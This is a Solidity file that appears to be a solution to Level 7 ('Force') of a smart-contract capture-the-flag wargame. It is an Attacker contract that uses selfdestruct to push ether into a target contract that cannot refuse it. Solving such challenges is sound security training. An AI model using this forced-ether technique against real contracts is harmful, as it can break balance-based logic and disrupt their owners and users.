//////////////////////////////////////
// Level 7 - Force
// By: Lorenzo Cesconetto
//////////////////////////////////////

// SPDX-License-Identifier: MIT

pragma solidity ^0.7.0;

// SOLUTION: call selfdestruct passing the target contract's address as parameter.
// Contracts can't avoid receiving ether.
contract Attacker {
    address payable target;

    constructor(address payable _target) payable {
        target = _target;
    }

    receive() external payable {}

    function selfDestroy() external {
        selfdestruct(target);
    }
}
